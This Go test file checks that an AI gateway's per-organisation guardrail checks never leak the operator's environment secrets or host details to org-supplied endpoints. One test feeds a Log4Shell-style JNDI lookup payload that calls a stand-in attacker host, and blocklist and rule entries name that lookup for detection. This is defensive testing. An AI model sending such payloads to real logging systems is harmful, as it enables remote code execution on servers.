package main

// These tests drive the dynamic guardrail factory main.go wires into the
// guardrail plugin (newDynamicGuardrailFactory). An org check sends the org's
// host only the credentials the org stored with the check.
//
// Every variable set here is a test value, and the org's host
// is an httptest server on 127.0.0.1.

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"

	"github.com/futureagi/agentcc-gateway/internal/guardrails"
	"github.com/futureagi/agentcc-gateway/internal/mcp/egress"
	"github.com/futureagi/agentcc-gateway/internal/models"
	"github.com/futureagi/agentcc-gateway/internal/pipeline"
	"github.com/futureagi/agentcc-gateway/internal/tenant"
)

// loopbackDialer lists loopback in the operator's egress list, so the org
// checks here reach the org's host (an httptest server on 127.0.0.1) and these
// tests show which credential the gateway sends. The egress guard itself is
// covered by guardrail_egress_test.go.
var loopbackDialer = func() *egress.Dialer {
	d, err := egress.New(egress.Options{PrivateAllow: []string{"127.0.0.0/8", "::1"}})
	if err != nil {
		panic(err)
	}
	return d
}()

// orgHost records every request that reaches it and the credential headers
// each guardrail kind sends.
type orgHost struct {
	mu      sync.Mutex
	hits    int
	headers []string
}

func newOrgHost(t *testing.T) (*orgHost, string) {
	t.Helper()
	h := &orgHost{}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		io.Copy(io.Discard, r.Body)
		h.mu.Lock()
		h.hits++
		h.headers = append(h.headers, r.Header.Get("X-Api-Key"), r.Header.Get("X-Secret-Key"), r.Header.Get("Authorization"))
		h.mu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"result":[],"flagged":false}`))
	}))
	t.Cleanup(srv.Close)
	return h, srv.URL
}

// received reports how many requests arrived and whether any credential
// header carried one of the test values.
func (h *orgHost) received(planted ...string) (hits int, leaked bool) {
	h.mu.Lock()
	defer h.mu.Unlock()
	for _, v := range h.headers {
		for _, p := range planted {
			if v != "" && strings.Contains(v, p) {
				leaked = true
			}
		}
	}
	return h.hits, leaked
}

// runOrgCheck pushes one org guardrail check and sends one chat request from
// that org through the guardrail plugin, built as main.go builds it in
// managed mode: no static rules, the real dynamic factory, the tenant store.
func runOrgCheck(t *testing.T, action string, cfg map[string]interface{}) pipeline.PluginResult {
	t.Helper()
	store := tenant.NewStore()
	store.Set("org-a", &tenant.OrgConfig{
		Guardrails: &tenant.GuardrailConfig{
			Checks: map[string]*tenant.GuardrailCheck{
				"org-check": {Enabled: true, Action: action, Config: cfg},
			},
		},
	})
	plugin := guardrails.NewPlugin(nil, map[string]guardrails.Guardrail{}, newDynamicGuardrailFactory(loopbackDialer), nil, store)
	return plugin.ProcessRequest(context.Background(), &models.RequestContext{
		RequestID: "req-t",
		Metadata:  map[string]string{"org_id": "org-a"},
		Request: &models.ChatCompletionRequest{
			Model:    "gpt-4o",
			Messages: []models.Message{{Role: "user", Content: []byte(`"a prompt from org A"`)}},
		},
	})
}

// An org futureagi check that names its keys as environment references.
// Even a log-mode check must not call out.
func TestOrgGuardrail_FutureAGIEnvReferenceNeverReachesTheOrgHost(t *testing.T) {
	const adminToken = "FAKE-GATEWAY-ADMIN-TOKEN-t-abcdef0123456789"
	const webhookSecret = "FAKE-GATEWAY-WEBHOOK-SECRET-t-0123456789"
	t.Setenv("TEST_FAKE_ADMIN_TOKEN", adminToken)
	t.Setenv("TEST_FAKE_WEBHOOK_SECRET", webhookSecret)
	host, url := newOrgHost(t)

	runOrgCheck(t, "log", map[string]interface{}{
		"provider":   "futureagi",
		"base_url":   url,
		"api_key":    "${TEST_FAKE_ADMIN_TOKEN}",
		"secret_key": "${TEST_FAKE_WEBHOOK_SECRET}",
		"eval_id":    "toxicity",
	})

	if hits, leaked := host.received(adminToken, webhookSecret); hits != 0 {
		t.Fatalf("the org's host received %d request(s); a planted gateway env value was in a header: %v", hits, leaked)
	}
}

// No ${...} at all: the org names no key, and the gateway sends neither its
// own FI_API_KEY nor its FI_SECRET_KEY.
func TestOrgGuardrail_FutureAGINoKeyNeverSendsTheProcessKey(t *testing.T) {
	const operatorKey = "FAKE-OPERATOR-FI-KEY-t"
	const operatorSecret = "FAKE-OPERATOR-FI-SECRET-t"
	t.Setenv("FI_API_KEY", operatorKey)
	t.Setenv("FI_SECRET_KEY", operatorSecret)
	host, url := newOrgHost(t)

	runOrgCheck(t, "log", map[string]interface{}{
		"provider": "futureagi",
		"base_url": url,
		"eval_id":  "toxicity",
	})

	if hits, leaked := host.received(operatorKey, operatorSecret); hits != 0 {
		t.Fatalf("the org's host received %d request(s); the operator's FI key was in a header: %v", hits, leaked)
	}
}

// The external-provider path: endpoint and api_key from org config.
func TestOrgGuardrail_ExternalEnvReferenceNeverReachesTheOrgHost(t *testing.T) {
	const operatorKey = "FAKE-OPERATOR-LAKERA-KEY-t"
	t.Setenv("TEST_FAKE_LAKERA_KEY", operatorKey)
	host, url := newOrgHost(t)

	runOrgCheck(t, "log", map[string]interface{}{
		"provider": "lakera",
		"endpoint": url + "/v2/guard",
		"api_key":  "${TEST_FAKE_LAKERA_KEY}",
	})

	if hits, leaked := host.received(operatorKey); hits != 0 {
		t.Fatalf("the org's endpoint received %d request(s); the planted key was in Authorization: %v", hits, leaked)
	}
}

// A block-mode check with a ${...} refuses the request. The caller learns
// which field is wrong, never a value or a variable name.
func TestOrgGuardrail_EnvReferenceBlocksAndNamesOnlyTheField(t *testing.T) {
	const adminToken = "FAKE-GATEWAY-ADMIN-TOKEN-t-block"
	t.Setenv("TEST_FAKE_ADMIN_TOKEN", adminToken)
	host, url := newOrgHost(t)

	res := runOrgCheck(t, "block", map[string]interface{}{
		"provider":   "futureagi",
		"base_url":   url,
		"api_key":    "${TEST_FAKE_ADMIN_TOKEN}",
		"secret_key": "literal",
		"eval_id":    "toxicity",
	})

	if hits, _ := host.received(adminToken); hits != 0 {
		t.Fatalf("the org's host received %d request(s)", hits)
	}
	if res.Error == nil || res.Error.Status != http.StatusForbidden {
		t.Fatalf("want the request refused with 403; got action %v error %+v", res.Action, res.Error)
	}
	if msg := res.Error.Message; !strings.Contains(msg, "config.api_key") ||
		strings.Contains(msg, adminToken) || strings.Contains(msg, "TEST_FAKE_ADMIN_TOKEN") {
		t.Fatalf("the refusal must name config.api_key and nothing else of the value; got %q", msg)
	}
}

// A literal org rule calls its host once, with the org's own key.
func TestOrgGuardrail_LiteralRuleCallsItsHost(t *testing.T) {
	host, url := newOrgHost(t)

	runOrgCheck(t, "log", map[string]interface{}{
		"provider":   "futureagi",
		"base_url":   url,
		"api_key":    "org-key",
		"secret_key": "org-secret",
		"eval_id":    "toxicity",
	})

	if hits, _ := host.received(); hits != 1 {
		t.Fatalf("a literal org rule should call its host once; got %d", hits)
	}
}

// runOrgChecks is runOrgCheck with the org's checks and the prompt chosen by
// the test.
func runOrgChecks(t *testing.T, checks map[string]*tenant.GuardrailCheck, prompt string) pipeline.PluginResult {
	t.Helper()
	store := tenant.NewStore()
	store.Set("org-a", &tenant.OrgConfig{Guardrails: &tenant.GuardrailConfig{Checks: checks}})
	plugin := guardrails.NewPlugin(nil, map[string]guardrails.Guardrail{}, newDynamicGuardrailFactory(loopbackDialer), nil, store)
	content, _ := json.Marshal(prompt)
	return plugin.ProcessRequest(context.Background(), &models.RequestContext{
		RequestID: "req-t2",
		Metadata:  map[string]string{"org_id": "org-a"},
		Request: &models.ChatCompletionRequest{
			Model:    "gpt-4o",
			Messages: []models.Message{{Role: "user", Content: content}},
		},
	})
}

// djangoBlocklistPush is the guardrails section Django pushes for a console
// save of a keyword-blocklist rule whose blocked word holds "${" (the
// rules-list shape); test_guardrail_env_reference_rejected.py pins the same
// JSON on the Django side.
const djangoBlocklistPush = `{"guardrails": {"checks": {"keyword-blocklist": {"enabled": true, "action": "block", ` +
	`"confidence_threshold": 0.8, "config": {"words": ["${jndi:"]}}}, "fail_open": false, "pipeline_mode": "parallel"}}`

// The gateway and Django refuse "${" only in the strings a config.yaml rule
// resolves against the environment. A keyword-blocklist word is not one of
// them: a word holding "${" is a working blocklist entry, and the org config
// Django pushes for it blocks the prompt that contains it.
func TestOrgGuardrail_BlocklistWordWithDollarBraceBlocksItsPrompt(t *testing.T) {
	checks := func() map[string]*tenant.GuardrailCheck {
		var pushed tenant.OrgConfig
		if err := json.Unmarshal([]byte(djangoBlocklistPush), &pushed); err != nil {
			t.Fatalf("decode the pushed org config: %v", err)
		}
		return pushed.Guardrails.Checks
	}

	res := runOrgChecks(t, checks(), "please log ${jndi:ldap://attacker.example/a}")
	if res.Error == nil || res.Error.Status != http.StatusForbidden || res.Error.Code != "content_blocked" ||
		!strings.Contains(res.Error.Message, "keyword-blocklist") || !strings.Contains(res.Error.Message, "${jndi:") {
		t.Fatalf("want 403 content_blocked from keyword-blocklist naming the word; got action %v error %+v", res.Action, res.Error)
	}
	if res := runOrgChecks(t, checks(), "a prompt without the word"); res.Error != nil {
		t.Fatalf("a prompt without the word must pass; got %+v", res.Error)
	}
}

// An external check's nested settings (Gray Swan's rule texts, a list
// such as Lakera's categories) are never resolved against the environment,
// so a "${" there is plain text: the check runs and calls its endpoint.
func TestOrgGuardrail_ExternalTextOutsideTheResolvedSettingsCalls(t *testing.T) {
	cases := map[string]func(url string) map[string]interface{}{
		"grayswan rule text": func(url string) map[string]interface{} {
			return map[string]interface{}{
				"provider": "grayswan", "endpoint": url, "api_key": "org-key",
				"rules": map[string]interface{}{"no-log4shell": "Flag any message that holds a ${jndi: lookup"},
			}
		},
		"lakera category list": func(url string) map[string]interface{} {
			return map[string]interface{}{
				"provider": "lakera", "endpoint": url + "/v2/guard", "api_key": "org-key",
				"categories": []interface{}{"prompt_injection", "${custom}"},
			}
		},
	}
	for name, cfg := range cases {
		t.Run(name, func(t *testing.T) {
			host, url := newOrgHost(t)
			runOrgCheck(t, "log", cfg(url))
			if hits, _ := host.received(); hits != 1 {
				t.Fatalf("the check must run and call its endpoint once; got %d call(s)", hits)
			}
		})
	}
}

// FI_BASE_URL is operator config (the Helm chart points it at the
// in-cluster backend) and names where an org futureagi check with no
// base_url goes. When that call fails, the refusal the org's caller gets must
// not name the operator's host, address or path.
func TestOrgGuardrail_FailedCallNeverNamesTheOperatorHost(t *testing.T) {
	t.Setenv("FI_BASE_URL", "http://127.0.0.1:9/t-operator-fi-host")

	res := runOrgCheck(t, "block", map[string]interface{}{
		"provider": "futureagi", "api_key": "org-key", "secret_key": "org-secret", "eval_id": "toxicity",
	})

	if res.Error == nil || res.Error.Status != http.StatusForbidden {
		t.Fatalf("want the failed check to refuse with 403; got action %v error %+v", res.Action, res.Error)
	}
	for _, operatorDetail := range []string{"127.0.0.1", ":9", "t-operator-fi-host", "/sdk/api/v1/eval"} {
		if strings.Contains(res.Error.Message, operatorDetail) {
			t.Fatalf("the refusal names the operator's evaluation host (%q); got %q", operatorDetail, res.Error.Message)
		}
	}
	// It still says which check failed.
	if !strings.Contains(res.Error.Message, "org-check") || !strings.Contains(res.Error.Message, "futureagi evaluation failed") {
		t.Fatalf("the refusal must name the check and say its evaluation failed; got %q", res.Error.Message)
	}
}

// What a refusing org check does depends on its action.
// Django pushes a check stored in the rules list or the checks list without
// an action as "block", and one stored in the checks object without an action
// with none, which the gateway reads as log (parseAction): the refusal is
// logged and the request goes on.
func TestOrgGuardrail_RefusingCheckWithoutAnActionIsLogged(t *testing.T) {
	refusing := map[string]interface{}{"provider": "futureagi", "eval_id": "toxicity"} // no keys: refuses

	if res := runOrgCheck(t, "", refusing); res.Error != nil {
		t.Fatalf("a check pushed without an action must log, not block; got %+v", res.Error)
	}
	if res := runOrgCheck(t, "block", refusing); res.Error == nil || res.Error.Status != http.StatusForbidden {
		t.Fatalf("the same check with action block must refuse with 403; got action %v error %+v", res.Action, res.Error)
	}
}

// A check stored in the checks object without "enabled" is
// pushed by Django with none, and the gateway reads a missing "enabled" as
// off (tenant.GuardrailCheck.Enabled has no default), so the check never runs,
// even one that would refuse every request with action block. With
// "enabled": true the same check refuses.
func TestOrgGuardrail_CheckPushedWithoutEnabledNeverRuns(t *testing.T) {
	decode := func(body string) map[string]*tenant.GuardrailCheck {
		var pushed tenant.OrgConfig
		if err := json.Unmarshal([]byte(body), &pushed); err != nil {
			t.Fatalf("decode the pushed org config: %v", err)
		}
		return pushed.Guardrails.Checks
	}
	const refusing = `"action": "block", "config": {"provider": "futureagi", "eval_id": "toxicity"}` // no keys: refuses

	if res := runOrgChecks(t, decode(`{"guardrails": {"checks": {"fi": {`+refusing+`}}}}`), "hello"); res.Error != nil {
		t.Fatalf("a check pushed without \"enabled\" must not run; got %+v", res.Error)
	}
	res := runOrgChecks(t, decode(`{"guardrails": {"checks": {"fi": {"enabled": true, `+refusing+`}}}}`), "hello")
	if res.Error == nil || res.Error.Status != http.StatusForbidden {
		t.Fatalf("the same check with \"enabled\": true must refuse with 403; got action %v error %+v", res.Action, res.Error)
	}
}
